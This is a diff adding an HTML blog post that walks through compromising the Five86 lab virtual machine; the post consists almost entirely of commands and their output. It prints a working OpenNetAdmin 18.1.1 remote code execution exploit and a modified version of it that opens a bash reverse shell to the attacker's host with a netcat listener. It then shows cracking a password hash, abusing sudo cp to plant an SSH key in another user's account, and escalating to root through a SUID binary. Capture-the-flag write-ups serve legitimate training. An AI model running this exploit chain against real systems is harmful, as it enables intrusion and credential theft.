@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin SEO tag -->
+<title>Five86 | 0bfxgh0st*</title>
+<meta name="generator" content="0bfxgh0st" />
+<meta property="og:title" content="Five86" />
+<meta name="author" content="0bfxgh0st" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Five86 WriteUp" />
+<meta property="og:description" content="Five86 WriteUp" />
+<link rel="icon" href="/assets/favicon.ico" />
+<link rel="canonical" href="#" />
+<meta property="og:url" content="#" />
+<meta property="og:site_name" content="0bfxgh0st*" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-02-25T00:00:00-05:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Five86" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"0bfxgh0st"},"dateModified":"2020-02-25T00:00:00-05:00","datePublished":"2020-02-25T00:00:00-05:00","description":"Five86 WriteUp","headline":"Welcome To 0bfxgh0st Blog","mainEntityOfPage":{"@type":"WebPage","@id":"#"},"url":"#"}</script>
+<!-- End SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="#" title="0bfxgh0st*" /></head><body><header class="site-header"><nav class="site-nav">
+      
+      <div class="trigger">
+            <a class="page-link" href="../">
+              [R]eturn
+            </a></div>
+    </nav><div class="site-icon">
+    <img src="/assets/default-icon.png" />
+  </div>
+
+</header>
+<main class="page-content" aria-label="Content">
+        <div class="wrapper">
+            <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Five86</h1>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>Port recognition with<code class="language-plaintext highlighter-rouge">nmap</code></p>
+
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">nmap</span> --min-rate 5000 -sV five86.vuln -p- --script=http-enum
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-10 12:00 EST
+Nmap scan report for five86.vuln (10.0.2.96)
+Host is up (0.000061s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
+80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+| http-enum: 
+|   /robots.txt: Robots file
+|_  /reports/: Potentially interesting folder (401 Unauthorized)
+10000/tcp open  http    MiniServ 1.920 (Webmin httpd)
+MAC Address: 08:00:27:CA:76:A6 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 32.54 seconds
+</code></pre></figure>
+
+<p>Nmap reports three open ports, 22 for ssh, 80 for apache server and 10000 for webmin server. Lua script http-enum show us robots.txt file and reports path</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">curl</span> http://five86.vuln/robots.txt                         
+User-agent: *
+Disallow: /ona
+</code></pre></figure>
+
+<p>We found another server route. After visiting http://five86.vuln/ona/ and click on About we will see OpenNetAdmin v18.1.1</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">searchsploit</span> "OpenNetAdmin 18.1.1 sh"
+------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                        |  Path
+------------------------------------------------------------------------------------------------------ ---------------------------------
+OpenNetAdmin 18.1.1 - Remote Code Execution                                                           | php/webapps/47691.sh
+------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">cat</span> /usr/share/exploitdb/exploits/php/webapps/47691.sh
+# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
+# Date: 2019-11-19
+# Exploit Author: mattpascoe
+# Vendor Homepage: http://opennetadmin.com/
+# Software Link: https://github.com/opennetadmin/ona
+# Version: v18.1.1
+# Tested on: Linux
+
+# Exploit Title: OpenNetAdmin v18.1.1 RCE
+# Date: 2019-11-19
+# Exploit Author: mattpascoe
+# Vendor Homepage: http://opennetadmin.com/
+# Software Link: https://github.com/opennetadmin/ona
+# Version: v18.1.1
+# Tested on: Linux
+
+#!/bin/bash
+
+URL="${1}"
+while true;do
+ echo -n "$ "; read cmd
+ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
+done
+</code></pre></figure>
+
+<p>We found a valid exploit</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">cat</span> 47691.sh
+#!/bin/bash
+
+URL="http://five86.vuln/ona/"
+cmd="bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.15%2F1337%200%3E%261%22"
+curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1 &
+nc -lvp 1337
+</code></pre></figure>
+
+<p>Modifying script to get a bash reverse shell and auto connect via netcat</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">bash</span> 47691.sh                       
+listening on [any] 1337 ...
+connect to [10.0.2.15] from five86.vuln [10.0.2.96] 46354
+bash: cannot set terminal process group (454): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@five86-1:/opt/ona/www$
+</code></pre></figure>
+
+<p>Connected</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">www-data@five86-1:/opt/ona/www$ ls /home
+douglas  jen  moss  richmond  roy
+www-data@five86-1:/opt/ona/www$ grep -r douglas / 2>/dev/null
+/var/lib/apt/lists/deb.debian.org_debian_dists_buster_main_binary-amd64_Packages:Homepage: https://github.com/douglascrockford/JSON-js
+/var/lib/apt/lists/deb.debian.org_debian_dists_buster_main_source_Sources:Homepage: https://github.com/douglascrockford/JSON-js
+/var/www/.htpasswd:douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1
+www-data@five86-1:/opt/ona/www$ cat /var/www/.htpasswd
+douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1
+
+# To make things slightly less painful (a standard dictionary will likely fail),
+# use the following character set for this 10 character password: aefhrt
+</code></pre></figure>
+
+<p>We found hashed credentials in /var/www/.htpasswd file by recursively looking for douglas string in whole system. According with the description we are going to create a custom wordlist</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">crunch</span> 10 10 aefhrt -o wordlist.txt
+Crunch will now generate the following amount of data: 665127936 bytes
+634 MB
+0 GB
+0 TB
+0 PB
+Crunch will now generate the following number of lines: 60466176 
+
+crunch: 100% completed generating output
+</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">john</span> --wordlist=wordlist.txt hash
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+fatherrrrr       (douglas)     
+1g 0:00:01:48 DONE (2023-03-10 13:15) 50.00g/s 52800p/s 52800c/s 52800C/s fatherrrra..fatherrtet
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+</code></pre></figure>
+
+<p>Cracked hash credentials obtained</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">ssh</span> douglas@five86.vuln  
+The authenticity of host 'five86.vuln (10.0.2.96)' can't be established.
+ED25519 key fingerprint is SHA256:c8HTcx7tPvrbA31UeXE5fRobpanfPTTHV85muCC7LpI.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'five86.vuln' (ED25519) to the list of known hosts.
+douglas@five86.vuln's password: 
+Linux five86-1 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+douglas@five86-1:~$ 
+</code></pre></figure>
+
+<p>Connected via ssh as douglas user</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">douglas@five86-1:~$ sudo -l
+Matching Defaults entries for douglas on five86-1:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User douglas may run the following commands on five86-1:
+    (jen) NOPASSWD: /bin/cp
+</code></pre></figure>
+
+<p>We can execute /bin/cp as jen user</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">douglas@five86-1:~/.ssh$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/douglas/.ssh/id_rsa): 
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/douglas/.ssh/id_rsa.
+Your public key has been saved in /home/douglas/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:gpZjZOSWm1ERjzBfKqHQ6p4s67xiaulAPBypVZdcvnE douglas@five86-1
+The key's randomart image is:
++---[RSA 2048]----+
+|..  *.==o        |
+| .o= Oo*         |
+| +o O + + E      |
+|=..+ B   +       |
+|o=  O . S        |
+|...o . .         |
+|+ o              |
+|=B               |
+|@*.              |
++----[SHA256]-----+
+</code></pre></figure>
+
+<p>Generating ssh keys</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">douglas@five86-1:~/.ssh$ cp -r id_rsa.pub /tmp/authorized_keys
+</code></pre></figure>
+
+<p>Creating authorized_keys in /tmp/ folder</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">douglas@five86-1:~/.ssh$ chmod 777 /tmp/authorized_keys
+</code></pre></figure>
+
+<p>Giving permissions</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">douglas@five86-1:~/.ssh$ sudo -u jen /bin/cp /tmp/authorized_keys /home/jen/.ssh/
+</code></pre></figure>
+
+<p>Copying authorized_keys to /home/jen/.ssh folder</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">douglas@five86-1:~/.ssh$ ssh jen@127.0.0.1
+The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:aE9ZqWXrvGgzgM21BjQ23GmxQVBeD5CZw0nUq8P8RyM.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
+Linux five86-1 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have new mail.
+Last login: Fri Mar 10 13:49:37 2023 from 127.0.0.1
+jen@five86-1:~$ 
+</code></pre></figure>
+
+<p>We are in the system as jen user now</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">jen@five86-1:~$ cat /var/mail/jen
+...
+Hi Jen,
+
+As you know, I'll be on the "customer service" course on Monday due to that incident on Level 4 with the accounts people.
+
+But anyway, I had to change Moss's password earlier today, so when Moss is back on Monday morning, can you let him know that his password is now Fire!Fire!
+
+Moss will understand (ha ha ha ha).
+
+Tanks,
+Roy
+...
+</code></pre></figure>
+
+<p>Following the message we found moss credentials</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">jen@five86-1:~$ su moss
+Password: 
+moss@five86-1:/home/jen$
+</code></pre></figure>
+
+<p>We changed to moss user</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">moss@five86-1:~$ find / -perm -u=s 2>/dev/null
+...
+/home/moss/.games/upyourgame
+moss@five86-1:~$ ls -la /home/moss/.games/upyourgame
+-rwsr-xr-x 1 root root 16824 Jan  1  2020 /home/moss/.games/upyourgame
+</code></pre></figure>
+
+<p>Found file to scalate to root with suid bit set</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">moss@five86-1:~$ strings /home/moss/.games/upyourgame
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+setuid
+__isoc99_scanf
+puts
+printf
+system
+__cxa_finalize
+__libc_start_main
+GLIBC_2.7
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+u/UH
+[]A\A]A^A_
+Would you like to play a game? 
+Could you please repeat that? 
+Nope, you'll need to enter that again. 
+You entered: No.  Is this correct? 
+We appear to have a problem?  Do we have a problem? 
+Made in Britain.
+/bin/sh
+;*3$"
+GCC: (Debian 8.3.0-6) 8.3.0
+crtstuff.c
+...
+</code></pre></figure>
+
+<p>Quick look with strings show us what seems a setuid system call to execute /bin/sh</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">moss@five86-1:~$ /home/moss/.games/./upyourgame
+Would you like to play a game? 0
+
+Could you please repeat that? 0
+
+Nope, you'll need to enter that again. 0
+
+You entered: No.  Is this correct? 0
+
+We appear to have a problem?  Do we have a problem? 0
+
+Made in Britain.
+# cat /root/flag.txt
+8f3b38dd95eccf600593da4522251746
+</code></pre></figure>
+
+<p>After entering random strings that don't follow the prompt workflow we will get a root shell</p>
+
+  </div>
+
+  <p class="post-meta"><time class="dt-published" datetime="2020-02-25T00:00:00-05:00" itemprop="datePublished">
+        Mar 10, 2023
+      </time>• 
+        <span itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <span class="p-author h-card" itemprop="name">0bfxgh0st</span></span></p>
+  
+
+  <a class="u-url" href="#" hidden></a>
+</article>
+
+  </div>
+        </div>
+    </main><footer class="site-footer h-card">
+    <data class="u-url" href="/"></data>
+
+    <div class="wrapper">
+
+        <div class="footer">
+
+        </div>
+    </div>
+
+</footer>
+</body>
+
+</html>
